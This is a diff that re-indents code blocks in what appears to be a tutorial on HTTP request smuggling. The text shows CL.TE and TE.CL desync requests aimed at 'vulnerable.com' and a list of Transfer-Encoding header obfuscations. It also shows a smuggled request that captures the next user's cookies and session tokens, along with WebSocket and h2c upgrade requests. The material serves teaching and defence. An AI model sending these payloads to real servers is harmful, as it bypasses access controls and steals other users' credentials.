@@ -1734,13 +1734,13 @@
 
     - This header indicates the encoding used for the message body. The most common value is 'chunked', which means the body is sent in chunks, each preceded by its size in hexadecimal. A chunk size of '0' indicates the end of the body. This is useful when the full size of the body is not known in advance, like in streaming responses or dynamically generated content. A chunked request looks like this:
     
-        POST / HTTP/1.1
-        Host: example.com
-        Transfer-Encoding: chunked
-        
-        b
-        hello=world
-        0
+            POST / HTTP/1.1
+            Host: example.com
+            Transfer-Encoding: chunked
+            
+            b
+            hello=world
+            0
         
     Here, 'b' is the hexadecimal representation of 11 which is the length of 'hello=world'. Then, the '0' indicates the end of the chunked body.
 
@@ -1754,14 +1754,14 @@
 
     - In this scenario, the front-end server uses 'Content-Length' to determine the length of the request, while the back-end uses 'Transfer-Encoding'. So, the front-end reads the entire body based on the Content-Length value and forwards it to the back-end. But the back-end processes it as chunked, and the leftover bytes after the '0\r\n\r\n' chunk terminator are treated as the beginning of a new request. An example request looks like:
     
-        POST / HTTP/1.1
-        Host: vulnerable.com
-        Content-Length: 30
-        Transfer-Encoding: chunked
-        
-        0
-        
-        GET /admin HTTP/1.1
+            POST / HTTP/1.1
+            Host: vulnerable.com
+            Content-Length: 30
+            Transfer-Encoding: chunked
+            
+            0
+            
+            GET /admin HTTP/1.1
         
     Here, the front-end sees 'Content-Length: 30' and forwards the entire body. The back-end processes it as chunked, reads '0' as the end of the first request, and then treats 'GET /admin HTTP/1.1' as the start of a brand new second request. This smuggled request could bypass access controls or interact with restricted endpoints.
 
@@ -1769,18 +1769,18 @@
 
     - This is the reverse of CL.TE. The front-end processes the request as chunked and the back-end relies on Content-Length. So, the front-end reads the body until the '0' chunk terminator and forwards everything. But the back-end only reads the number of bytes specified by Content-Length, and the remaining bytes are left in the buffer to be interpreted as the next request. An example will be:
     
-        POST / HTTP/1.1
-        Host: vulnerable.com
-        Content-Length: 4
-        Transfer-Encoding: chunked
-        
-        5c
-        GPOST /admin HTTP/1.1
-        Content-Type: application/x-www-form-urlencoded
-        Content-Length: 15
-        
-        x=1
-        0
+            POST / HTTP/1.1
+            Host: vulnerable.com
+            Content-Length: 4
+            Transfer-Encoding: chunked
+            
+            5c
+            GPOST /admin HTTP/1.1
+            Content-Type: application/x-www-form-urlencoded
+            Content-Length: 15
+            
+            x=1
+            0
         
     The front-end reads it as chunked and forwards the whole thing. But the back-end reads only 4 bytes from the body because of 'Content-Length: 4', and the rest of the data starting from 'GPOST /admin...' is queued up and interpreted as a separate request.
 
@@ -1788,19 +1788,19 @@
 
     - When both the front-end and back-end support Transfer-Encoding, the attack relies on obfuscating the header so that one of the servers fails to recognise it as a valid Transfer-Encoding header. This causes a fallback to Content-Length, effectively creating a CL.TE or TE.CL scenario. Various obfuscation techniques can be used:
     
-        Transfer-Encoding: xchunked
-        
-        Transfer-Encoding : chunked
-        
-        Transfer-Encoding: chunked
-        Transfer-Encoding: x
-        
-        Transfer-Encoding:[tab]chunked
-        
-        X: x[\n]Transfer-Encoding: chunked
-        
-        Transfer-Encoding
-        : chunked
+            Transfer-Encoding: xchunked
+            
+            Transfer-Encoding : chunked
+            
+            Transfer-Encoding: chunked
+            Transfer-Encoding: x
+            
+            Transfer-Encoding:[tab]chunked
+            
+            X: x[\n]Transfer-Encoding: chunked
+            
+            Transfer-Encoding
+            : chunked
         
     Each of these can trick one server into ignoring the header while the other processes it. The key is to experiment and see which obfuscation technique causes the desync between the two servers in the chain.
 
@@ -1812,19 +1812,19 @@
 
     - One of the most powerful outcomes of a desync attack is hijacking other users' requests. When we smuggle a partial request into the back-end's buffer, the next legitimate user's request gets appended to our smuggled request. So, if we smuggle a POST request to an endpoint that reflects or stores data, the victim's request including their cookies, session tokens, and credentials gets attached to our smuggled request body. This is like sitting in a queue and cutting the line where everyone else's ticket ends up in our pocket. A smuggled request for hijacking could look like:
     
-        POST / HTTP/1.1
-        Host: vulnerable.com
-        Content-Length: 100
-        Transfer-Encoding: chunked
-        
-        0
-        
-        POST /log HTTP/1.1
-        Host: vulnerable.com
-        Content-Type: application/x-www-form-urlencoded
-        Content-Length: 400
-        
-        data=
+            POST / HTTP/1.1
+            Host: vulnerable.com
+            Content-Length: 100
+            Transfer-Encoding: chunked
+            
+            0
+            
+            POST /log HTTP/1.1
+            Host: vulnerable.com
+            Content-Type: application/x-www-form-urlencoded
+            Content-Length: 400
+            
+            data=
         
     When the next user sends their request, the back-end appends it to the 'data=' parameter. Now the smuggled request captures the victim's entire HTTP request with all the sensitive headers and cookies.
 
@@ -1844,12 +1844,12 @@
 
     - The initial handshake looks like this:
     
-        GET /chat HTTP/1.1
-        Host: example.com
-        Upgrade: websocket
-        Connection: Upgrade
-        Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
-        Sec-WebSocket-Version: 13
+            GET /chat HTTP/1.1
+            Host: example.com
+            Upgrade: websocket
+            Connection: Upgrade
+            Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+            Sec-WebSocket-Version: 13
         
     If the server supports WebSocket, it responds with:
     
@@ -1872,11 +1872,11 @@
     
     - The upgrade request looks like:
     
-        GET / HTTP/1.1
-        Host: example.com
-        Upgrade: h2c
-        HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
-        Connection: Upgrade, HTTP2-Settings
+            GET / HTTP/1.1
+            Host: example.com
+            Upgrade: h2c
+            HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
+            Connection: Upgrade, HTTP2-Settings
         
     If the front-end blindly forwards this and the back-end upgrades the connection, the attacker now has a direct HTTP/2 channel to the back-end that is invisible to the front-end.
 
